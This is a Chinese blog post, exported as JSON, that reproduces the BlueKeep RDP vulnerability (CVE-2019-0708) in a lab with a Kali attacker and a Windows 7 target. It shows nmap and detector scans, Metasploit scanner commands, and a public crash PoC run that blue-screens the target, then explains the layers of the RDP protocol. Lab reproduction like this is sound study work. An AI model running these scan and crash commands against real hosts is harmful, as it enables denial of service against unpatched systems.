{"title":"CVE-2019-0708","slug":"CVE-2019-0708","date":"2020-10-16","updated":"2020-09-10","comments":true,"path":"api/posts/37771.json","excerpt":null,"cover":"https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png","covers":["https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png","https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png","https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png"],"content":"<p>2019 年 5 月 14 日爆出 CVE-2019-0708 漏洞，高危漏洞，影响范围较广，通过远程桌面端口 3389，RDP 协议进行攻击。</p>\n<p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p>\n<h1 id=\"蓝屏\"><a href=\"# 蓝屏\" class=\"headerlink\" title=\"蓝屏\"></a>蓝屏 </h1><h2 id=\"环境\"><a href=\"# 环境\" class=\"headerlink\" title=\"环境\"></a> 环境 </h2><p> 攻击机：kali IP：192.168.119.128</p>\n<p>靶机：win7 IP:192.168.119.139 (开放 3389 端口)</p>\n<p>工具：RDP 漏洞扫描工具、MSF</p>\n<p>POC：<a href=\"https://github.com/n1xbyte/CVE-2019-0708\" target=\"_blank\" rel=\"noopener\">https://github.com/n1xbyte/CVE-2019-0708</a></p>\n<h2 id=\"复现\"><a href=\"# 复现\" class=\"headerlink\" title=\"复现\"></a>复现</h2><p>nmap 对 win7 端口扫描:</p>\n<p><img src=\"https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png\" alt=\"nmap 扫描 3389.PNG\"></p>\n<p>RDP 工具在 win7 上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p>\n<p><img src=\"https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png\" alt=\"漏扫工具扫描 3389（win7 自身）.PNG\"></p>\n<p>启动 MSF<br>查找漏洞： <code>search 0708</code></p>\n<p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p>\n<p>查看参数： <code>show options</code></p>\n<p>设置靶机 IP： <code>set rhosts 192.168.119.139</code></p>\n<p>运行：<code>run</code></p>\n<h3 id=\"漏洞攻击\"><a href=\"# 漏洞攻击\" class=\"headerlink\" title=\"漏洞攻击\"></a>漏洞攻击 </h3><p> 在 kali 中安装 pip3, 安装 impacket 库。下载 poc。<br>切进目录 CVE-2019-0708</p>\n<p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p>\n<p>攻击成功，win7 变为蓝屏。</p>\n<p><img src=\"https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png\" alt=\"win7 蓝屏.PNG\"></p>\n<h2 id=\"知识点\"><a href=\"# 知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点 </h2><h4 id=\"RDP 协议\"><a href=\"#RDP 协议\" class=\"headerlink\" title=\"RDP 协议\"></a>RDP 协议</h4><p>RDP, 远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br> 基本层次结构：</p>\n<ul>\n<li>网络连接层：RDP 协议建立在 tcp/ip 协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的 RDP 数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li>\n<li>ISO 数据层：在网络连接层之上是 ISO 数据层，标识 RDP 数据的正常连接通信。</li>\n<li>虚拟通道层：在 ISO 数据层之上，RDP 协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li>\n<li>加密解密层：在虚拟通道层之上，RDP 定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li>\n<li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li>\n</ul>\n<p>连接过程说明：</p>\n<ul>\n<li>客户端连接服务器</li>\n<li>ISO 数据层建立连接</li>\n<li>发送初始协议相关信息，接收加密、解密秘钥</li>\n<li>虚拟通道申请</li>\n<li>加密形式发送客户端系统信息，同时验证加密协议</li>\n<li>平台软件证书验证</li>\n<li>各功能建立连接，各功能数据传输，功能实现。</li>\n</ul>\n","url":"/posts/37771/","min2read":2,"word4post":648,"prev_post":{"title":"CVE-2019-0808","url":"/posts/37051/"},"next_post":{"title":"CVE-2006-3439","url":"/posts/55466/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" data-id=\"蓝屏\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">蓝屏 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"环境\" href = \"#\"><span class=\"toc-number\">1.1.</span> <span class=\"toc-text\"> 环境 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"复现\" href = \"#\"><span class=\"toc-number\">1.2.</span> <span class=\"toc-text\">复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"漏洞攻击\" href = \"#\"><span class=\"toc-number\">1.2.1.</span> <span class=\"toc-text\">漏洞攻击 </span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"知识点\" href = \"#\"><span class=\"toc-number\">1.3.</span> <span class=\"toc-text\">知识点 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" data-id=\"RDP 协议\" href = \"#\"><span class=\"toc-number\">1.3.0.1.</span> <span class=\"toc-text\">RDP 协议</span></a></li></ol></li></ol></li></ol></li></ol>","categories":[],"tags":[{"name":"windows漏洞","path":"api/tags/windows漏洞.json","url":"/tags/windows漏洞/"}]}